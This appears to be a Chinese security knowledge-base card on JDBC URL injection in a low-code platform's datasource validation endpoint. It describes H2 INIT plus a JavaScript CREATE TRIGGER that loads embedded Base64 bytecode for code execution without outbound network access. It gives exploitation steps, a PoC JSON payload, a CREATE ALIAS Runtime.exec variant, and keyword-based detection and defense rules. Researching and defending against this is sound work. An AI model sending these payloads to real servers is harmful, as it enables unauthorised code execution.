---
id: web-java-component-lowcode-datasource-validate-h2-javascript-trigger-rce
title: 低代码平台数据源配置校验接口 JDBC URL 注入：H2 init CREATE TRIGGER JavaScript 不出网 RCE
type: scenario
domain: web
path: web/java/component
technique: datasource-config-jdbc-url-h2-javascript-trigger-rce
aliases:
- validateC3p0DBConfig 注入
- c3p0 数据源配置校验 RCE
- H2 CREATE TRIGGER javascript
- H2 init 不出网 RCE
- jdbc:h2:mem init trigger
- 低代码平台 JDBC RCE
tags:
- java
- jdbc
- h2
- c3p0
- datasource
- rce
- low-code
- javascript
- trigger
- spring
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V192
  verified_at: '2026-11-06T23:06:14+08:00'
  notes: 已对照幻灯片第31-32页核对：validateC3p0DBConfig到driver.connect、H2 init CREATE TRIGGER javascript、Base64类与不出网说明一致；无完整HTTP请求响应，未本机复跑。
---

## 一句话结论

低代码/数据源管理平台的配置校验接口 `validateC3p0DBConfig(@RequestBody Map config)` 从请求 JSON 读取 `jdbcDriver`、`url`、`user`、`password` 并直接调用 `driver.connect(url, properties)`；当 classpath 存在 H2 时，把 URL 换成 `jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER ... AS $$//javascript ...$$`，H2 在建立连接时执行 `INIT` SQL、创建并触发 JavaScript 触发器，通过当前线程 `ContextClassLoader` 加载内嵌 Base64 Java 字节码，实现不出网代码执行。

## 原理

- **入口**：某低代码开发平台的 Spring MVC 接口 `validateC3p0DBConfig(@RequestBody Map config)`（`SpecialMethod.validateC3p0DBConfig`）从 `config` 中取出 `jdbcDriver`、`url`、`user`、`password`，必要时解密密码，然后 `driver.connect(url, properties)` 建立连接；没有对驱动类名/JDBC URL 做白名单或语义校验。
- **H2 INIT**：H2 的 JDBC URL 支持 `INIT=` 参数，驱动在建立连接时会执行其中的 SQL。攻击者可以放入 `CREATE TRIGGER ... BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript ...$$`，H2 会编译并注册该触发器；当连接初始化或后续查询 `INFORMATION_SCHEMA.TABLES` 时触发。
- **JavaScript 触发器**：`//javascript` 前缀告诉 H2 用 JavaScript 引擎编译触发器体。H2 1.4.x 在存在 JS 引擎（如 JDK 8–14 的 Nashorn）时支持该语法；JS 代码可直接访问 Java 类，例如 `java.lang.Thread.currentThread().getContextClassLoader()`，再用 `loadClass`/`newInstance` 或把 Base64 字节码交给自定义类加载器执行。
- **不出网**：Java 字节码以 Base64 字符串形式嵌在 URL/JS 中，不依赖远程类加载或外部 HTTP 服务；因此即使目标禁止出网，也能完成代码执行（区别于 JNDI/LDAP 远程 codebase 的利用方式）。
- **为什么成立**：JDBC URL 是“连接配置”，不是 inert 数据；H2 把 `INIT` 当作连接初始化脚本执行，`CREATE TRIGGER ... AS` 又把 SQL 字符串交给脚本引擎。应用只要允许用户控制 URL 且 classpath 有 H2，就等于把脚本执行能力交给了用户。攻击者还可以先通过项目依赖（`pom.xml`/`lib` 下的 `h2-*.jar`）确认 H2 存在，再选择对应 payload。
- **版本/环境**：`//javascript` 触发器的可用性取决于 H2 版本与 JDK 是否有 JS 引擎；没有 JS 引擎时可退化用 `CREATE ALIAS ... AS 'Java 源码'` + `CALL`（H2 1.4.200 常见），或 `RUNSCRIPT FROM` 远程/本地 SQL；这些变体属于同一“JDBC URL 注入 → H2 初始化执行”根因。

## 触发条件

- 目标存在数据源配置/连接校验接口，且 `jdbcDriver`、`url`、`user`、`password` 可由请求 JSON 控制；入口是否需要登录未在演讲中说明。
- 应用 classpath 含 H2 驱动（低代码平台、测试/监控组件常内置），且 H2 版本支持 `INIT`（1.4.x 常见）。
- 目标 JDK/H2 组合支持 `//javascript` 触发器（JDK 8–14 的 Nashorn 或 H2 内置脚本引擎）；否则需使用 `CREATE ALIAS`/`RUNSCRIPT` 变体。
- 攻击者能构造合法 JSON 请求并观察连接错误/副作用；不出网利用不需要目标访问外部服务。

## 利用步骤

1. 找到数据源配置/校验接口（如 `validateC3p0DBConfig`），确认请求体 JSON 中的 `jdbcDriver`、`url` 字段被直接用于 `driver.connect`。
2. 查项目依赖（`pom.xml`、`WEB-INF/lib`）确认存在 `h2`，并尽量判断 H2/JDK 版本。
3. 构造 JSON：`jdbcDriver=org.h2.Driver`，`url` 以 `jdbc:h2:mem:testa;MODE=MSSQLServer;init=` 开头，后接 `CREATE TRIGGER ... AS $$//javascript ...$$`，JS 中通过 `ContextClassLoader` 加载内嵌 Base64 Java 类并实例化。
4. 发送请求触发 `driver.connect`；H2 解析 URL 并执行 `INIT`，触发器在初始化/查询 `INFORMATION_SCHEMA.TABLES` 时执行。
5. 用 DNSLog、VPS 回连或命令副作用（如写文件/启动进程）确认执行；不出网场景可用 `curl` 到内网或直接观察命令结果。
6. 若 `//javascript` 被禁用，改用 `INIT=CREATE ALIAS ... AS 'Java 源码'\;CALL ...` 或 `INIT=RUNSCRIPT FROM '...'`。

## PoC

> 演讲给出了 payload 片段与“真实环境测试”结论，但未给出完整 HTTP 请求/响应；以下为按代码与 H2 语法重构的最小结构，Base64 类体需按目标 JDK 生成。

```json
{
  "jdbcDriver": "org.h2.Driver",
  "url": "jdbc:h2:mem:testa;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\nvar cl = java.lang.Thread.currentThread().getContextClassLoader();\ntry { cl.loadClass('Inject').newInstance(); } catch(e) { var b = java.util.Base64.getDecoder().decode('yv66vgAAADQANgoACQ...'); /* defineClass/loadClass */ }\n$$",
  "user": "sa",
  "password": ""
}
```

```text
# 变体（无 JS 引擎时）：H2 1.4.200 CREATE ALIAS
jdbc:h2:mem:testa;INIT=CREATE ALIAS IF NOT EXISTS EXEC AS 'void exec(String c) throws Exception { Runtime.getRuntime().exec(c)\; }'\;CALL EXEC('calc')
```

## 变体与关联

- 与 [[web-java-deserialization-h2-jdbc-init-create-alias-rce]] 同属 H2 `INIT` 代码执行，但触发入口不同：该卡通过反序列化 `JdbcDataSource.getConnection` 触发，本卡是 Web 配置校验接口直接 `driver.connect`；payload 也从 `CREATE ALIAS` 变为 `CREATE TRIGGER //javascript`。
- 与 [[web-java-component-dataease-json-driver-override-jdbc-rce]] 同类：都是数据源配置接口允许用户控制 driver/URL，区别是 DataEase 用 type 混淆绕过 H2 黑名单，本卡是无过滤的直接连接。
- 与 [[web-java-component-aj-report-datasource-testconnection-jdbc-local-infile-read]] 同类：数据源“测试连接”把 `jdbcUrl` 原样交给驱动；该卡利用 MySQL 恶意服务端读文件，本卡利用 H2 `INIT` 执行代码。
- 变体：H2 `RUNSCRIPT FROM`、`CREATE ALIAS`、`CREATE TRIGGER //javascript` 三条路径；H2 2.x 对 `INIT` 限制更严，需按版本调整。

## 检测与防御

- 数据源配置接口禁止用户完全控制 `jdbcDriver` 与 `jdbcUrl`；驱动类名用服务端白名单，URL 只允许预置模板与主机/库名参数。
- 拒绝 URL 中出现 `INIT`、`RUNSCRIPT`、`CREATE ALIAS`、`CREATE TRIGGER`、`//javascript`、`$$` 等 H2 初始化/脚本特征；对 URL 做解析后校验，而不是只做字符串黑名单。
- 生产环境移除 H2 依赖（仅测试使用），或升级到限制 `INIT` 的版本；数据源配置接口加管理员鉴权与审计。
- 检测：JDBC URL 中出现 `jdbc:h2`、`INIT=`、`CREATE TRIGGER`、`//javascript`、`Base64` 长字符串；应用进程在连接后启动子进程或加载异常类。
- 注意：不出网利用不依赖外部回连，网络出站限制不能阻止该链；需从输入校验和依赖治理入手。
